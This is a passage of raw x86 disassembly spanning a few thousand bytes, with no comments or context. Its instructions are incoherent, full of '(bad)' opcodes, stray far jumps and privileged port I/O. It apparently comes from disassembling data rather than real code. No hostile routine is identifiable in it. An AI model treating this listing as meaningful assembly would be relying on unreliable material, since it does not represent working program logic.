  40966a:	push   es
  40966b:	jb     0x4096c6
  40966d:	cmc    
  40966e:	in     eax,0x30
  409670:	arpl   WORD PTR [ebx-0x7220fdc4],ax
  409676:	mov    ebp,0xb0c322d9
  40967b:	jmp    0xc203fd5
  409680:	mov    ecx,0x7c6c10e9
  409685:	inc    edx
  409686:	xchg   DWORD PTR [ebx-0x7b0f81a],esp
  40968c:	enter  0x9d3e,0x1c
  409690:	imul   esp,edi,0x52790b95
  409696:	or     bh,BYTE PTR [esi+0x5c]
  409699:	sti    
  40969a:	mov    ah,0xfc
  40969c:	std    
  40969d:	loopne 0x409712
  40969f:	xchg   eax,edx
  4096a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096a2:	inc    esp
  4096a3:	cmp    DWORD PTR ds:0xd12bcb33,ecx
  4096a9:	or     ebp,DWORD PTR [edi+0x3e]
  4096ac:	xchg   edx,eax
  4096ad:	into   
  4096ae:	fdiv   QWORD PTR [edx+0x44]
  4096b1:	mov    al,ds:0xf10e6746
  4096b6:	inc    ebp
  4096b7:	push   eax
  4096b8:	and    dl,BYTE PTR [eax+eax*8-0xc1cc44c]
  4096bf:	dec    edx
  4096c0:	xor    al,0xa9
  4096c2:	push   ds
  4096c3:	jno    0x4096be
  4096c5:	xor    al,0x5b
  4096c7:	ret    0xbe48
  4096ca:	cmp    bh,BYTE PTR ds:0x891d7a55
  4096d0:	cmp    al,0x97
  4096d2:	imul   esi
  4096d4:	ret    0xc380
  4096d7:	cmp    ebp,DWORD PTR [eax+0x24dc81c5]
  4096dd:	hlt    
  4096de:	add    eax,0xfeade481
  4096e3:	aaa    
  4096e4:	ss pop eax
  4096e6:	retf   0x1013
  4096e9:	popf   
  4096ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4096eb:	ins    DWORD PTR es:[edi],dx
  4096ec:	mov    esi,0x16e4d4b8
  4096f1:	xchg   DWORD PTR ds:0xc422e626,ebp
  4096f7:	shl    DWORD PTR [ebx],0xfd
  4096fa:	jno    0x409777
  4096fc:	push   edi
  4096fd:	and    BYTE PTR [ebx],0x7
  409700:	stos   DWORD PTR es:[edi],eax
  409701:	adc    al,0x3e
  409703:	sub    DWORD PTR [ebp+edi*1+0x746565cb],ebx
  40970a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40970b:	mov    ah,0x18
  40970d:	dec    ebp
  40970e:	cmp    BYTE PTR [eax],0x5c
  409711:	dec    esi
  409712:	inc    BYTE PTR [edi+0x14c4cd57]
  409718:	aad    0x85
  40971a:	inc    esi
  40971b:	call   0xc334:0xc7f585af
  409722:	test   eax,0xa0ea3713
  409727:	call   0x862af3d4
  40972c:	addr16 sub al,0x7c
  40972f:	push   ds
  409730:	ja     0x409723
  409732:	popf   
  409733:	cmp    eax,0xb369941e
  409738:	ficomp WORD PTR [ebx]
  40973a:	mov    eax,ds:0xac04e1a1
  40973f:	mov    ah,ah
  409741:	mov    ebx,0xa3cc9e93
  409746:	inc    edx
  409747:	sbb    BYTE PTR [edi+0x6b],0xc4
  40974b:	and    dl,BYTE PTR [eax-0x396793e8]
  409751:	push   edx
  409752:	push   ss
  409753:	jp     0x40970b
  409755:	push   esi
  409756:	es pop ecx
  409758:	cmp    al,0x78
  40975a:	pop    ebx
  40975b:	ffreep st(0)
  40975d:	enter  0x57ce,0x3c
  409761:	call   0x7ca9:0x103386ca
  409768:	repz jp 0x409701
  40976b:	inc    esp
  40976c:	xchg   DWORD PTR [esi-0x20],eax
  40976f:	mov    al,0x43
  409771:	cmp    DWORD PTR [ecx-0x13c65164],esi
  409777:	xchg   edi,ecx
  409779:	int3   
  40977a:	loopne 0x409751
  40977c:	stos   DWORD PTR es:[edi],eax
  40977d:	xor    BYTE PTR [edi+0x63],ah
  409780:	push   edi
  409781:	les    edx,FWORD PTR [ecx]
  409783:	add    ch,BYTE PTR [ebx-0x765117fa]
  409789:	add    BYTE PTR [ecx-0x76],ah
  40978c:	fadd   QWORD PTR [ecx]
  40978e:	cmp    al,0xea
  409790:	les    edx,FWORD PTR [ebp+0x14e538a4]
  409796:	sub    BYTE PTR [edi-0x31],bh
  409799:	js     0x409786
  40979b:	ins    DWORD PTR es:[edi],dx
  40979c:	inc    ebp
  40979d:	retf   
  40979e:	mov    edx,0xf86229d
  4097a3:	jg     0x409752
  4097a5:	add    DWORD PTR [ecx+0x1929b153],edi
  4097ab:	popf   
  4097ac:	retf   0xd230
  4097af:	push   ds
  4097b0:	mov    al,0xc2
  4097b2:	fisubr WORD PTR [esi+eiz*4-0x25]
  4097b6:	mov    bl,0xdf
  4097b8:	jle    0x409779
  4097ba:	adc    eax,0x43970755
  4097bf:	push   es
  4097c0:	jmp    0x7fcb3cf
  4097c5:	gs mov dl,0xec
  4097c8:	dec    ebx
  4097c9:	mov    edx,0xf8e3e589
  4097ce:	call   0x863eb70c
  4097d3:	je     0x40978d
  4097d5:	pop    ebx
  4097d6:	sub    cl,BYTE PTR [edx+esi*1]
  4097d9:	sub    BYTE PTR [esi+0x10],dl
  4097dc:	test   DWORD PTR [esp+eax*1],ebx
  4097df:	inc    ebx
  4097e0:	(bad)  
  4097e1:	mov    al,0x3f
  4097e3:	dec    esp
  4097e4:	xlat   BYTE PTR ds:[ebx]
  4097e5:	pop    ebp
  4097e6:	push   ss
  4097e7:	xchg   ecx,eax
  4097e8:	outs   dx,BYTE PTR ds:[esi]
  4097e9:	retf   
  4097ea:	ss std 
  4097ec:	or     ecx,ecx
  4097ee:	test   eax,0x455e2aa6
  4097f3:	mov    edi,0xae8acac1
  4097f8:	loopne 0x40985e
  4097fa:	pop    ss
  4097fb:	cmp    eax,0x51e0633d
  409800:	je     0x409822
  409802:	adc    esi,DWORD PTR [edx-0x2e]
  409805:	(bad)  
  409806:	ss out dx,eax
  409808:	mov    al,ds:0x14fede34
  40980d:	scas   al,BYTE PTR es:[edi]
  40980e:	adc    eax,0xd5523257
  409813:	or     dh,dl
  409815:	imul   ebx,DWORD PTR [ecx+0x1b7c53d6],0xffffff95
  40981c:	mov    fs,WORD PTR [edx+0x3a8869da]
  409822:	jno    0x40984c
  409824:	inc    edx
  409825:	(bad)  
  409826:	push   esp
  409827:	push   es
  409828:	jnp    0x409866
  40982a:	test   BYTE PTR [ebx+0x5e79b55b],ah
  409830:	push   eax
  409831:	push   0xffffffcd
  409833:	and    DWORD PTR [eax-0x5e],ebx
  409836:	and    ch,ah
  409838:	data16 jbe 0x40989a
  40983b:	ins    BYTE PTR es:[edi],dx
  40983c:	jae    0x409867
  40983e:	aad    0x1b
  409840:	cmc    
  409841:	sbb    dh,BYTE PTR ds:0xe6d10d01
  409847:	cmp    eax,0xc02a2d27
  40984c:	dec    ebp
  40984d:	shl    BYTE PTR [ecx+0x28],1
  409850:	popf   
  409851:	inc    ebp
  409852:	or     al,0x41
  409854:	and    al,0xae
  409856:	ror    DWORD PTR [edi-0x250e0cdd],0x56
  40985d:	cmp    al,0xd8
  40985f:	cmc    
  409860:	ja     0x4097f0
  409862:	sub    esp,DWORD PTR [ebx-0x7]
  409865:	xor    al,0x5a
  409867:	jecxz  0x409891
  409869:	cmp    sp,cx
  40986c:	jp     0x4098d8
  40986e:	lea    edx,[ebp-0x6]
  409871:	and    BYTE PTR [edi+0x75f050b3],ch
  409877:	ja     0x409825
  409879:	xor    al,0x25
  40987c:	xor    bl,BYTE PTR [ebx+eiz*1]
  40987f:	call   0x890bc950
  409884:	dec    ecx
  409885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409886:	idiv   DWORD PTR [ebx-0x2546f248]
  40988c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40988d:	cmp    DWORD PTR [ecx-0x61],esi
  409890:	call   0x1238:0x8633f05
  409897:	and    eax,edi
  409899:	xchg   ebp,eax
  40989a:	add    eax,0x799421f2
  40989f:	sub    eax,0x95843dad
  4098a4:	pop    ebx
  4098a5:	aaa    
  4098a6:	fsubr  DWORD PTR [ebp+0x4062ad04]
  4098ac:	mov    dh,0x48
  4098ae:	int3   
  4098af:	fs push 0x1ec1b846
  4098b5:	outs   dx,DWORD PTR ds:[esi]
  4098b6:	loop   0x409922
  4098b8:	mov    al,ds:0x8ef22d32
  4098bd:	inc    ebp
  4098be:	sbb    eax,0xea618a4a
  4098c3:	nop
  4098c4:	out    0x4c,al
  4098c6:	lods   eax,DWORD PTR ds:[esi]
  4098c7:	mov    ah,0xb3
  4098c9:	xchg   edx,eax
  4098ca:	pusha  
  4098cb:	scas   eax,DWORD PTR es:[edi]
  4098cc:	and    eax,DWORD PTR [esi]
  4098ce:	push   0xe28cf3ed
  4098d3:	hlt    
  4098d4:	jmp    0x409866
  4098d6:	mov    eax,ds:0x5a97550
  4098db:	sbb    esp,ebp
  4098dd:	bound  esi,QWORD PTR [ebp+ebx*8+0x61dab40]
  4098e4:	add    eax,DWORD PTR [edx-0x34]
  4098e7:	mov    ah,0x7b
  4098e9:	shr    DWORD PTR [ecx+edi*2],cl
  4098ec:	and    al,0xff
  4098ee:	add    BYTE PTR [ebp+0x7b],ah
  4098f1:	data16 jnp 0x40990e
  4098f4:	fst    QWORD PTR [edx-0x3599ebba]
  4098fa:	or     al,0x8b
  4098fc:	jnp    0x40987e
  4098fe:	in     al,0x67
  409900:	jne    0x40997b
  409902:	loope  0x40992b
  409904:	or     BYTE PTR [ebx],bh
  409906:	out    dx,eax
  409907:	xchg   esp,eax
  409908:	xchg   ecx,eax
  409909:	popa   
  40990a:	dec    esp
  40990b:	mov    esi,0xe88510d
  409910:	inc    edx
  409911:	daa    
  409912:	leave  
  409913:	loopne 0x409994
  409915:	mov    eax,DWORD PTR [esi+edi*4-0x40365aba]
  40991c:	adc    dl,BYTE PTR [esi-0x14]
  40991f:	sub    esi,DWORD PTR [ebx+0x7c]
  409922:	pop    edx
  409923:	shl    DWORD PTR [esi],0x10
  409926:	jns    0x40999b
  409928:	sbb    ecx,DWORD PTR [esi+0x49]
  40992b:	dec    ecx
  40992c:	jbe    0x409908
  40992e:	fistp  WORD PTR [eax-0x2558179f]
  409934:	push   ecx
  409935:	pop    edx
  409936:	push   0xffffffe6
  409938:	fbstp  TBYTE PTR [edi-0x23]
  40993b:	pop    edi
  40993c:	(bad)  
  40993d:	add    al,BYTE PTR [edi-0x14d63f4b]
  409943:	call   0x64984fdb
  409948:	sbb    edi,esp
  40994a:	adc    esp,ebx
  40994c:	test   al,0xfb
  40994e:	sub    edi,DWORD PTR [edi]
  409950:	xor    al,0x70
  409952:	aad    0xdb
  409954:	xchg   esp,eax
  409955:	lea    eax,[esi]
  409957:	pop    ebx
  409958:	mov    al,ds:0x6ab60421
  40995d:	js     0x4098fa
  40995f:	xor    eax,0x9069fbae
  409964:	xor    ecx,ebp
  409966:	push   ecx
  409967:	in     al,0x36
  409969:	mov    eax,ds:0x4d523ccc
  40996e:	outs   dx,DWORD PTR ds:[esi]
  40996f:	push   cs
  409970:	push   ds
  409971:	test   eax,0x5770e4df
  409976:	jp     0x40998a
  409978:	fldenv [esi-0x639ae160]
  40997e:	stos   BYTE PTR es:[edi],al
  40997f:	loop   0x4099ee
  409981:	or     eax,0x16586d10
  409986:	inc    eax
  409987:	in     eax,dx
  409988:	cwde   
  409989:	sbb    DWORD PTR [ebx+0x7a],ecx
  40998c:	jmp    0x4ba6b2e7
  409991:	cmp    eax,DWORD PTR [eax+eax*2]
  409994:	cmp    al,0xef
  409996:	popf   
  409997:	and    ebp,DWORD PTR [ecx-0x20]
  40999a:	mov    BYTE PTR [esi+0x26b9404],0x27
  4099a1:	enter  0x48a4,0x37
  4099a5:	pop    ds
  4099a6:	das    
  4099a7:	mov    esi,0x2453ebcd
  4099ac:	pop    esi
  4099ad:	adc    eax,0x6cbd8f00
  4099b2:	aam    0xa1
  4099b4:	dec    edx
  4099b5:	ret    
  4099b6:	test   BYTE PTR [ecx+0x1bbbbfa5],0x53
  4099bd:	sub    eax,0x6e5fa01d
  4099c2:	popf   
  4099c3:	cmp    ecx,ecx
  4099c5:	jbe    0x409971
  4099c7:	shl    DWORD PTR [ecx+0x3b],cl
  4099ca:	jle    0x4099e7
  4099cc:	mov    bh,BYTE PTR [ecx+0x2a]
  4099cf:	sbb    bh,BYTE PTR [ebx-0x12c47c11]
  4099d5:	and    edx,DWORD PTR [esi-0x80]
  4099d8:	test   eax,0xf71dff12
  4099dd:	sub    ebp,DWORD PTR [esi+0x72]
  4099e0:	pusha  
  4099e1:	neg    dl
  4099e3:	dec    edi
  4099e4:	xor    bl,BYTE PTR [edx]
  4099e6:	dec    esi
  4099e7:	inc    esi
  4099e8:	jmp    0x529c:0x49414f4e
  4099ef:	aaa    
  4099f0:	mov    esp,0x77df184f
  4099f5:	cs pop ds
  4099f7:	lods   eax,DWORD PTR ds:[esi]
  4099f8:	xor    eax,0x9a4b0b85
  4099fd:	loopne 0x4099fc
  4099ff:	sti    
  409a00:	jae    0x409989
  409a02:	xor    al,0x61
  409a04:	push   ebp
  409a05:	int    0x81
  409a07:	cmc    
  409a08:	or     ch,al
  409a0a:	sub    al,0x72
  409a0c:	xchg   esp,eax
  409a0d:	xchg   BYTE PTR [ebp-0x62087052],bl
  409a13:	add    cl,BYTE PTR [edx+0xf3bffa4]
  409a19:	fisubr WORD PTR [ebx+0x210eb8a8]
  409a1f:	pusha  
  409a20:	push   es
  409a21:	ror    BYTE PTR [ebx-0x6c],cl
  409a24:	xchg   esi,eax
  409a25:	(bad)  
  409a26:	mov    ds:0xf197a85b,al
  409a2b:	(bad)  
  409a2c:	pusha  
  409a2d:	sub    esi,eax
  409a2f:	mov    WORD PTR es:[ebp+ecx*1+0x21c770e6],cs
  409a37:	push   ds
  409a38:	xchg   ebx,eax
  409a39:	out    dx,al
  409a3a:	mov    ch,0x48
  409a3c:	sub    DWORD PTR [ebx+ebp*4+0x20],0xfffffff1
  409a41:	inc    eax
  409a42:	xchg   edi,eax
  409a43:	pop    esi
  409a44:	mov    esp,0x72d42775
  409a49:	rcr    BYTE PTR [esi-0x7f2e0940],cl
  409a4f:	stos   DWORD PTR es:[edi],eax
  409a50:	and    eax,0x59858b99
  409a55:	ret    
  409a56:	and    edi,DWORD PTR [eax-0x3f]
  409a59:	jne    0x409a92
  409a5b:	(bad)  
  409a5c:	enter  0xf941,0xf
  409a60:	xlat   BYTE PTR ds:[ebx]
  409a61:	push   ebp
  409a62:	(bad)  
  409a63:	enter  0x8960,0x4c
  409a67:	(bad)  
  409a68:	xlat   BYTE PTR ds:[ebx]
  409a69:	mov    edx,0x54deed3b
  409a6e:	daa    
  409a6f:	retf   
  409a70:	test   ecx,esp
  409a72:	mov    edi,0xf5f4717e
  409a77:	xchg   BYTE PTR [esi+0x5a],dl
  409a7a:	jg     0x409aac
  409a7c:	push   ebp
  409a7d:	jo     0x409a25
  409a7f:	stos   DWORD PTR es:[edi],eax
  409a80:	das    
  409a81:	xchg   esp,eax
  409a82:	sub    al,0x38
  409a84:	fnstsw WORD PTR [eax]
  409a86:	and    ah,bh
  409a88:	mov    ch,0x33
  409a8a:	mov    dl,0xcc
  409a8c:	ret    
  409a8d:	mov    cl,0x9
  409a8f:	mov    ds:0xad3bd7fb,eax
  409a94:	cmc    
  409a95:	jecxz  0x409b09
  409a97:	out    0x2b,al
  409a99:	out    0x55,al
  409a9b:	pop    ecx
  409a9c:	and    al,0x8d
  409a9e:	fsin   
  409aa0:	push   ss
  409aa1:	cmp    ebx,DWORD PTR [eax+0x6ffbb9c4]
  409aa7:	fs jns 0x409a35
  409aaa:	mov    eax,0x99d99c6
  409aaf:	xchg   edi,eax
  409ab0:	jge    0x409a92
  409ab2:	(bad)  
  409ab4:	popf   
  409ab5:	and    bh,BYTE PTR [eax+0x4c]
  409ab8:	jbe    0x409b0a
  409aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409abb:	in     al,dx
  409abc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409abd:	scas   eax,DWORD PTR es:[edi]
  409abe:	sbb    eax,0xcf3fc2b6
  409ac3:	xor    DWORD PTR [ecx-0x17],edx
  409ac6:	jl     0x409ab0
  409ac8:	outs   dx,BYTE PTR es:[esi]
  409aca:	mov    bh,0x64
  409acc:	lods   eax,DWORD PTR ds:[esi]
  409acd:	jmp    0x3926eea6
  409ad2:	data16 mov ah,0x7d
  409ad5:	les    ebx,FWORD PTR [eax]
  409ad7:	pop    edx
  409ad8:	shr    eax,0x79
  409adb:	shr    DWORD PTR [ebp-0x4f13b81e],0x3d
  409ae2:	arpl   WORD PTR [ecx-0x34601e06],cx
  409ae8:	jb     0x409aad
  409aea:	sti    
  409aeb:	aam    0x7a
  409aed:	hlt    
  409aee:	out    0x10,al
  409af0:	jg     0x409aeb
  409af2:	ss inc ecx
  409af4:	mov    al,0xe7
  409af6:	dec    esp
  409af7:	test   ecx,eax
  409af9:	out    0x2a,eax
  409afb:	ins    BYTE PTR es:[edi],dx
  409afc:	dec    ecx
  409afd:	or     DWORD PTR [esi-0x2e],0xc07861
  409b04:	in     al,0xb5
  409b06:	mov    al,BYTE PTR [esi+esi*8+0x2d719dbc]
  409b0d:	aad    0x5e
  409b0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b10:	mov    cl,BYTE PTR [ebx+0x5f48c59d]
  409b16:	jp     0x409ad5
  409b18:	arpl   WORD PTR [edi],dx
  409b1a:	pop    ds
  409b1b:	mov    dl,0x74
  409b1d:	jmp    0x1bf0:0x9bf5ee91
  409b24:	dec    ebx
  409b25:	fnsave [ebx-0x73]
  409b28:	(bad)  
  409b29:	pop    ss
  409b2a:	mov    bl,0xd
  409b2c:	loope  0x409ae2
  409b2e:	mov    dh,0x1a
  409b30:	sahf   
  409b31:	push   eax
  409b32:	mov    dh,0xa8
  409b34:	stos   BYTE PTR es:[edi],al
  409b35:	aaa    
  409b36:	out    0xc6,al
  409b38:	imul   esp,DWORD PTR [ebx],0x4a
  409b3b:	xchg   BYTE PTR [ecx-0x31d412bb],bh
  409b41:	mov    edx,0x9f6898d9
  409b46:	outs   dx,DWORD PTR ds:[esi]
  409b47:	mov    ebx,0xb58af4e2
  409b4c:	inc    esp
  409b4d:	sub    esi,DWORD PTR [ebp+0x69]
  409b50:	jmp    0x41cc:0x3d79e356
  409b57:	mov    DWORD PTR [edi],edi
  409b59:	pusha  
  409b5a:	adc    ebx,ebp
  409b5c:	push   cs
  409b5d:	push   ebx
  409b5e:	leave  
  409b5f:	out    dx,al
  409b60:	cmp    bh,BYTE PTR [edi+0x64]
  409b63:	push   ebp
  409b64:	rcl    DWORD PTR [ecx-0x35c15bf2],0xa8
  409b6b:	cmp    eax,0x4c2a5c15
  409b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b71:	test   eax,0xb426399f
  409b76:	sub    DWORD PTR [edi],esi
  409b78:	mov    bl,BYTE PTR [eax]
  409b7a:	(bad)  
  409b7c:	push   edi
  409b7d:	inc    eax
  409b7e:	inc    eax
  409b7f:	add    BYTE PTR [ecx+0x547cdd3f],ch
  409b85:	add    ah,bl
  409b87:	pushf  
  409b88:	pop    ebp
  409b89:	mov    al,ds:0xc984edfb
  409b8e:	bound  ebp,QWORD PTR [esi+0x12]
  409b91:	out    dx,al
  409b92:	or     esi,esi
  409b94:	mov    bh,0xfe
  409b96:	push   ecx
  409b97:	dec    ecx
  409b98:	adc    bl,cl
  409b9a:	cmp    ch,ah
  409b9c:	rol    DWORD PTR [ebx+0x28cbbeb1],cl
  409ba2:	or     cl,dl
  409ba4:	push   ebx
  409ba5:	push   0xdbbcdf5
  409baa:	aaa    
  409bab:	fldln2 
  409bad:	add    eax,0xf23174d5
  409bb2:	mov    al,ds:0xfa2b4ad2
  409bb7:	dec    ebx
  409bb8:	push   ss
  409bb9:	pushf  
  409bba:	repnz (bad) 
  409bbc:	jnp    0x409c02
  409bbe:	not    BYTE PTR [edx]
  409bc0:	ins    BYTE PTR es:[edi],dx
  409bc1:	js     0x409bc7
  409bc3:	push   ss
  409bc4:	add    dh,bl
  409bc6:	(bad)  
  409bc7:	loopne 0x409b9b
  409bc9:	sub    eax,0x8d08c6ce
  409bce:	int3   
  409bcf:	adc    bh,BYTE PTR [edx]
  409bd1:	xchg   ebp,eax
  409bd2:	inc    edx
  409bd3:	fild   QWORD PTR [esp+esi*2]
  409bd6:	outs   dx,BYTE PTR ds:[esi]
  409bd7:	inc    ecx
  409bd8:	and    esi,DWORD PTR [ecx-0x3099353f]
  409bde:	xor    BYTE PTR [esi],dl
  409be0:	fistp  WORD PTR [ecx-0x78c16bec]
  409be6:	test   al,0xbe
  409be8:	push   esp
  409be9:	mov    ebp,0xe31ad6a3
  409bee:	push   edi
  409bef:	repnz sbb ah,ah
  409bf2:	sbb    DWORD PTR [ebp-0x10],0x47
  409bf6:	xlat   BYTE PTR ds:[ebx]
  409bf7:	aas    
  409bf8:	pop    ebx
  409bf9:	xor    DWORD PTR [ebp+0x32],0xfffffff2
  409bfd:	inc    ebx
  409bfe:	inc    edx
  409bff:	xor    eax,0xa8186590
  409c04:	cs push ss
  409c06:	pop    es
  409c07:	mov    eax,0x1e6ddb65
  409c0c:	and    DWORD PTR ds:0xb15c0654,ebx
  409c12:	ret    
  409c13:	icebp  
  409c14:	sub    eax,0x6db6811f
  409c19:	cmp    bh,BYTE PTR [ecx]
  409c1b:	loop   0x409bed
  409c1d:	cli    
  409c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c1f:	add    DWORD PTR [esi],eax
  409c21:	sbb    BYTE PTR [esi],dl
  409c23:	mov    ds:0xb58bae69,eax
  409c28:	push   ds
  409c29:	sar    DWORD PTR [esp+ecx*1-0x6a],0x5e
  409c2e:	je     0x409c65
  409c30:	add    eax,0xf6eace8e
  409c35:	out    0x50,eax
  409c37:	outs   dx,BYTE PTR ds:[esi]
  409c38:	ss ss sbb al,0x55
  409c3c:	test   BYTE PTR [esi],ah
  409c3e:	dec    ebp
  409c3f:	mov    dh,0x50
  409c41:	add    DWORD PTR [edi+0x30],edx
  409c44:	dec    edi
  409c45:	add    DWORD PTR [ebp+0x9],ecx
  409c48:	in     al,dx
  409c49:	mov    eax,DWORD PTR ds:0x69673995
  409c4f:	ss pop ecx
  409c51:	lods   al,BYTE PTR ds:[esi]
  409c52:	pop    ebp
  409c53:	push   ebx
  409c54:	mov    ds:0x6a0d29c3,eax
  409c59:	jb     0x409c01
  409c5b:	pop    ebp
  409c5c:	cmp    al,0x1a
  409c5e:	mov    edi,0x83ed8810
  409c63:	ins    DWORD PTR es:[edi],dx
  409c64:	sbb    edx,DWORD PTR [eax-0x288d1d51]
  409c6a:	and    eax,0x759fcc84
  409c6f:	inc    ecx
  409c70:	cmc    
  409c71:	jg     0x409c76
  409c73:	fpatan 
  409c75:	(bad)  
  409c76:	les    ecx,FWORD PTR [edx-0x3c]
  409c79:	imul   edi,DWORD PTR [esi],0xd9da0c57
  409c7f:	push   ebp
  409c80:	pop    eax
  409c81:	push   0x0
  409c83:	mov    ebp,0x43c315e2
  409c88:	fstp   TBYTE PTR [edx]
  409c8a:	mov    eax,0x263f503f
  409c8f:	sub    eax,0x329cf31c
  409c94:	ins    BYTE PTR es:[edi],dx
  409c95:	xchg   edx,eax
  409c96:	jo     0x409c3e
  409c98:	ins    DWORD PTR es:[edi],dx
  409c99:	pop    ebx
  409c9a:	inc    BYTE PTR [edx+0x7]
  409c9d:	ins    DWORD PTR es:[edi],dx
  409c9e:	loope  0x409cd2
  409ca0:	scas   al,BYTE PTR es:[edi]
  409ca1:	push   es
  409ca2:	pusha  
  409ca3:	sbb    BYTE PTR [eax],dh
  409ca5:	jb     0x409c95
  409ca7:	lods   eax,DWORD PTR ds:[esi]
  409ca8:	push   DWORD PTR [ebx-0x5b6e66e0]
  409cae:	jmp    0x409cd2
  409cb0:	inc    ebp
  409cb1:	cwde   
  409cb2:	repnz pop edi
  409cb4:	jae    0x409c39
  409cb6:	push   0x5b021fb2
  409cbb:	inc    dx
  409cbd:	cmp    ch,ah
  409cbf:	sub    eax,0x8a78008c
  409cc4:	(bad)  
  409cc5:	mov    al,BYTE PTR [edi+0x78cca499]
  409ccb:	ficomp WORD PTR [esi-0x2ff7f13b]
  409cd1:	adc    al,0x84
  409cd3:	mov    ecx,0x34d59237
  409cd8:	sahf   
  409cd9:	inc    esi
  409cda:	das    
  409cdb:	jo     0x409cbc
  409cdd:	(bad)  
  409cde:	mov    ds:0x1323eca9,al
  409ce3:	sbb    BYTE PTR [edi-0x2b],al
  409ce6:	dec    esi
  409ce7:	jl     0x409cbf
  409ce9:	mov    esi,0x355ab47a
  409cee:	sbb    eax,0x174297c6
  409cf3:	out    0x15,al
  409cf5:	das    
  409cf6:	adc    BYTE PTR [esi+0x1f],al
  409cf9:	pop    esp
  409cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cfb:	jmp    0x409d23
  409cfd:	retf   
  409cfe:	cmp    DWORD PTR [ebp-0x281939fd],edx
  409d04:	pop    edi
  409d05:	(bad)  
  409d06:	(bad)  
  409d07:	lods   al,BYTE PTR ds:[esi]
  409d08:	mov    al,0x58
  409d0a:	xchg   BYTE PTR [eax-0x37],bl
  409d0d:	pop    ds
  409d0e:	bnd jne 0x409d59
  409d11:	xchg   esi,eax
  409d12:	cmp    DWORD PTR [ecx+ebx*1],ebx
  409d15:	es div eax
  409d18:	jle    0x409ceb
  409d1a:	cmc    
  409d1b:	mov    al,ds:0xf9299caf
  409d20:	je     0x409ce9
  409d22:	xor    bh,BYTE PTR [esi-0x5e]
  409d25:	icebp  
  409d26:	rcl    DWORD PTR [eax+0x23],0x4a
  409d2a:	cmp    DWORD PTR ds:[ecx+ecx*2+0x2cd734d],ebp
  409d32:	leave  
  409d33:	arpl   WORD PTR [esi+0xc91fa25],dx
  409d39:	mov    fs,WORD PTR [edx-0x59c30d49]
  409d3f:	popf   
  409d40:	pop    ds
  409d41:	pop    edx
  409d42:	(bad)  
  409d43:	sar    BYTE PTR [ecx+0xd],cl
  409d46:	jns    0x409ce9
  409d48:	push   edi
  409d49:	mov    ebp,DWORD PTR [esi-0x743c3c7]
  409d4f:	xor    edi,ebx
  409d51:	out    0xe,eax
  409d53:	dec    ecx
  409d54:	xlat   BYTE PTR ds:[ebx]
  409d55:	out    dx,eax
  409d56:	out    dx,eax
  409d57:	bound  eax,QWORD PTR [edi+0x2]
  409d5a:	sub    bh,BYTE PTR [edi+0x7d6347e6]
  409d60:	add    al,0x2a
  409d62:	push   0x9cf6a615
  409d67:	or     DWORD PTR ds:0x62638c0c,ebp
  409d6d:	ja     0x409d50
  409d6f:	outs   dx,BYTE PTR ds:[esi]
  409d70:	cmp    DWORD PTR [ebx],esp
  409d72:	repnz bound edi,QWORD PTR [esi-0x16]
  409d76:	int    0x1e
  409d78:	loopne 0x409db3
  409d7a:	jle    0x409d0e
  409d7c:	call   0x2e18:0xe12dca4a
  409d83:	mov    al,ds:0x789c72de
  409d88:	lea    edi,[ecx]
  409d8a:	mov    ch,0xf6
  409d8c:	sbb    DWORD PTR [eax-0x35adb550],ebp
  409d92:	dec    esi
  409d93:	clc    
  409d94:	pop    ebx
  409d95:	or     al,0x7a
  409d97:	or     ebx,DWORD PTR ds:0x855c2782
  409d9d:	or     BYTE PTR [ecx],cl
  409d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409da0:	jg     0x409d31
  409da2:	sbb    DWORD PTR [edi-0x524d240e],ebx
  409da8:	mov    WORD PTR [edi-0x66],cs
  409dab:	or     al,0x92
  409dad:	xchg   ebp,esi
  409daf:	dec    edi
  409db0:	mov    ebp,ecx
  409db2:	dec    ebx
  409db3:	mov    eax,0x635781a0
  409db8:	inc    esp
  409db9:	js     0x409dfa
  409dbb:	cmp    eax,0xe6bd40d4
  409dc0:	inc    edi
  409dc1:	fdivr  QWORD PTR [ecx-0x7c27f4c2]
  409dc7:	and    BYTE PTR [eax],ah
  409dc9:	inc    edx
  409dca:	lods   eax,DWORD PTR ds:[esi]
  409dcb:	cmc    
  409dcc:	jmp    0x409dbb
  409dce:	rcr    BYTE PTR [ebp-0x3f],0x9e
  409dd2:	push   0xffffffcd
  409dd4:	mov    al,ds:0xa9113d96
  409dd9:	lea    esi,[esi+0x39]
  409ddc:	mov    WORD PTR [ebp+edi*2+0x28bba5b3],?
  409de3:	mov    esp,0x854a778
  409de8:	dec    eax
  409de9:	(bad)  
  409dea:	or     eax,DWORD PTR ds:0x82279952
  409df0:	int    0xa2
  409df2:	loope  0x409dd7
  409df4:	and    al,al
  409df6:	ss push edx
  409df8:	int    0xc7
  409dfa:	adc    BYTE PTR [ecx+ebp*2+0x113a0322],bh
  409e01:	mov    edx,0xe7235c1c
  409e06:	jmp    0xe61b:0x740c600b
  409e0d:	repz imul BYTE PTR [edi+0x5d]
  409e11:	mov    esp,0x141404a
  409e16:	fist   DWORD PTR es:[ecx]
  409e19:	or     esi,DWORD PTR [eax-0x79026b75]
  409e1f:	add    al,0xc2
  409e21:	in     eax,dx
  409e22:	push   cs
  409e23:	fsubr  DWORD PTR [esi+0x322c55fd]
  409e29:	sti    
  409e2a:	jl     0x409e0e
  409e2c:	ror    BYTE PTR [ecx],cl
  409e2e:	jne    0x409dc7
  409e30:	daa    
  409e31:	mov    ecx,0x51bf4c49
  409e36:	inc    ebx
  409e37:	jno    0x409dd8
  409e39:	cmp    edi,DWORD PTR [ecx+0x6c3a789d]
  409e3f:	xor    edi,esi
  409e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e42:	ficomp DWORD PTR [ebx+0x3e68e486]
  409e48:	pop    ss
  409e49:	into   
  409e4a:	push   es
